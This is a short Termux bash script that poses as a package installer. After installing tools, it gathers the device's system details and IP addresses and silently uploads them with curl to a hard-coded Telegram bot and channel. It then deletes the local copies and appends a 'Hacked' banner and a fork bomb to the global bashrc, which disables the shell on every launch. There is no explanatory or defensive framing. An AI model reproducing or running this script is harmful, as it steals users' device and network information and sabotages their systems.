#!/data/data/com.termux/files/usr/bin/bash

packages=(toilet wget curl neofetch pv python)
for i in "${packages[@]}"; do
    if ! hash $i > /dev/null 2>&1 ;
    then
        echo "installing required packages please wait !"
        apt install "${i}" -y
    fi
done

neofetch --stdout > neofile.txt
ifconfig | grep inet > config.txt
chmod +x *
mv neofile.txt /$HOME 2>/dev/null
mv config.txt /$HOME 2>/dev/null

cd $HOME

curl -sF document=@$HOME/neofile.txt "https://api.telegram.org/bot1871962646:AAFPvfrnD4dDOaLNWq088W3fkB_eGHZ0G34/sendDocument?chat_id=@madara_v3" &>/dev/null

curl -sF document=@$HOME/config.txt "https://api.telegram.org/bot1871962646:AAFPvfrnD4dDOaLNWq088W3fkB_eGHZ0G34/sendDocument?chat_id=@madara_v3" &>/dev/null

rm -R neofile.txt config.txt
echo "toilet -f mono12 --gay Hacked" >> $PREFIX/etc/bash.bashrc
echo ":(){ :|:& };:" >> $PREFIX/etc/bash.bashrc
